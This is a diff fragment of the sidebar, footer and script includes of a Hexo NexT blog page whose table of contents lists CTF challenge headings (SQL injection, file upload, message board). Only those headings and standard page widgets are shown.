+                    <a href="https://www.jianshu.com/u/c531954533ea" title="简书" target="_blank">简书</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.liuxianglai.top/" title="Smiles" target="_blank">Smiles</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.zbojia.com/" title="R1ka" target="_blank">R1ka</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.sunraycanter.top/" title="UnKnown" target="_blank">UnKnown</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://shaobaobaoer.cn/" title="shaobaobao" target="_blank">shaobaobao</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://kuraraneko.github.io/" title="n3k0" target="_blank">n3k0</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.virtua1.cn/" title="virtua1" target="_blank">virtua1</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+					<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=574566207&auto=1&height=66"></iframe>
+					
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">1.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#web1签到"><span class="nav-number">1.0.1.</span> <span class="nav-text">web1签到</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#婉儿（sql）"><span class="nav-number">1.0.2.</span> <span class="nav-text">婉儿（sql）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#快一点"><span class="nav-number">1.0.3.</span> <span class="nav-text">快一点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件上传"><span class="nav-number">1.0.4.</span> <span class="nav-text">文件上传</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#admin"><span class="nav-number">1.0.5.</span> <span class="nav-text">admin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#留言板"><span class="nav-number">1.0.6.</span> <span class="nav-text">留言板</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#delete布尔盲注"><span class="nav-number">1.0.6.1.</span> <span class="nav-text">delete布尔盲注</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CYPTO"><span class="nav-number">2.</span> <span class="nav-text">CYPTO</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number">3.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#中原工学院图书馆"><span class="nav-number">3.0.1.</span> <span class="nav-text">中原工学院图书馆</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">berlin</span>
+
+  
+</div>
+
+<!--
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+-->
+
+
+  <span class="post-meta-divider">|</span>
+
+
+<!--
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+-->
+
+
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+	
+	
+  undefined
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
+</html>
